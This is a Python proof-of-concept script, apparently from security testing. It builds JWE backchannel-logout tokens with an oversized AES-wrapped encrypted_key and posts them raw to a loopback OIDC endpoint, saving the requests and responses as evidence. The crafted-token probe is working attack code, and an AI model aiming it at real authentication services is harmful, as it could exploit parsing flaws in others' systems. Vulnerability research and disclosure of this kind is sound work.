#!/usr/bin/env python3
"""Send raw loopback backchannel-logout POSTs with oversized compact-JWE encrypted_key."""
import base64
import os
import socket
import struct
import sys
import urllib.parse

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

HOST = "127.0.0.1"
PORT = 18443
KEK = bytes.fromhex("dfddb556b3b94eb2ef3d0f8d14b96085")
A6 = b"\xa6" * 8
EVIDENCE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")


def b64u(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def wrap(plaintext, kek=KEK):
    assert len(plaintext) % 8 == 0 and len(plaintext) >= 16
    n = len(plaintext) // 8
    a = A6
    r = [plaintext[i * 8:(i + 1) * 8] for i in range(n)]
    cipher = Cipher(algorithms.AES(kek), modes.ECB()).encryptor()
    for j in range(6):
        for i in range(1, n + 1):
            block = cipher.update(a + r[i - 1])
            a = bytes(x ^ y for x, y in zip(block[:8], struct.pack(">Q", n * j + i)))
            r[i - 1] = block[8:]
    return a + b"".join(r)


def token(ek_len, kid=None, kek=KEK, plaintext=None):
    # ek_len is raw (decoded) encrypted_key length: 40 = correct A128KW, 56 = oversized.
    assert ek_len >= 16 and ek_len % 8 == 0
    if plaintext is None:
        plaintext = b"\x5a" * (ek_len - 8)
    assert len(plaintext) == ek_len - 8
    ek = wrap(plaintext, kek)
    header = {"alg": "A128KW", "enc": "A128CBC-HS256"}
    if kid:
        header["kid"] = kid
    h = b64u(__import__("json").dumps(header, separators=(",", ":")).encode())
    return ".".join((h, b64u(ek), b64u(os.urandom(16)), b64u(b"\x11" * 48), b64u(b"\x22" * 32)))


def main():
    scenario = sys.argv[1]
    if scenario == "no_kid_oversized":
        tok, ek_len = token(56), 56
    elif scenario == "kid_rsa_oversized":
        tok, ek_len = token(56, "w2-rsa-kid"), 56
    elif scenario == "kid_rsa_valid":
        tok, ek_len = token(40, "w2-rsa-kid"), 40
    else:
        raise SystemExit("BAD_SCENARIO=" + scenario)

    body = urllib.parse.urlencode({"logout_token": tok}).encode("ascii")
    req = (b"POST /redirect_uri?logout=backchannel HTTP/1.1\r\n"
           b"Host: 127.0.0.1:18443\r\n"
           b"User-Agent: w2-loopback-probe\r\n"
           b"Content-Type: application/x-www-form-urlencoded\r\n"
           b"Content-Length: " + str(len(body)).encode() + b"\r\n"
           b"Connection: close\r\n\r\n" + body)
    with open(os.path.join(EVIDENCE, "request-" + scenario + ".bin"), "wb") as f:
        f.write(req)
    with open(os.path.join(EVIDENCE, "token-" + scenario + ".txt"), "w") as f:
        f.write(tok + "\n")
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(req)
        chunks = []
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks.append(data)
    resp = b"".join(chunks)
    with open(os.path.join(EVIDENCE, "response-" + scenario + ".bin"), "wb") as f:
        f.write(resp)
    print("SCENARIO=%s EK_RAW_LEN=%d TOKEN_LEN=%d" % (scenario, ek_len, len(tok)))
    print("RESPONSE=" + repr(resp[:200]))


if __name__ == "__main__":
    main()
